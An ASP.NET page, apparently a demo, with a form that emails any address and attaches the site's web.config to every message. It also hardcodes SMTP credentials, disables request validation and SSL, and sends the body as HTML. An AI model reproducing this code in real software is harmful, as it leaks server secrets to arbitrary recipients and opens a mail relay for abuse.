<%@ Page Language="C#" ValidateRequest="false" %>
<%@ Import Namespace="System.Net.Mail" %>

<!DOCTYPE html>

<script runat="server">

    void btnSend_Click(Object sender, System.EventArgs e)
    {
        try
        {
            MailMessage m = new MailMessage();
            m.To.Add(new MailAddress(txtTo.Text));
            m.From = new MailAddress(txtFrom.Text);
            m.Subject = txtSubject.Text;
            m.IsBodyHtml = true;
            m.Body = txtBody.Text;
            

            //add web.config as attachment
            Attachment a1 = new  Attachment(Request.MapPath("web.config"));
            m.Attachments.Add(a1);
            SmtpClient smtp = new SmtpClient("localhost");
            // logon to server 
            smtp.UseDefaultCredentials = false;
            smtp.EnableSsl = false;
            smtp.Credentials = new System.Net.NetworkCredential("admin@st.com", "a");
            smtp.Send(m);
            lblMsg.Text = "Mail Sent";
        }
        catch (Exception ex)
        {
            lblMsg.Text = "Error --> " + ex.Message;
        }
    }

</script>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>
</head>
<body>
    <form id="form1" runat="server">
        <h3>Send Mail</h3>
        <table>
            <tr>
                <td>To</td>
                <td>
                    <asp:TextBox ID="txtTo" runat="server"></asp:TextBox>
                </td>
            </tr>
            <tr>
                <td>From </td>
                <td>
                    <asp:TextBox ID="txtFrom" runat="server"></asp:TextBox>
                </td>
            </tr>
            <tr>
                <td>Subject</td>
                <td>
                    <asp:TextBox ID="txtSubject" runat="server" Width="319px">
                    </asp:TextBox></td>
            </tr>
            <tr>
                <td>Body</td>
                <td>
                    <asp:TextBox ID="txtBody" runat="server"
                        Height="112px" TextMode="MultiLine" /></td>
            </tr>
        </table>
        <asp:Button ID="Button1" runat="server" OnClick="btnSend_Click"
            Text="Send" /><p />
        <asp:Label ID="lblMsg" runat="server"></asp:Label>
    </form>
</body>
</html>
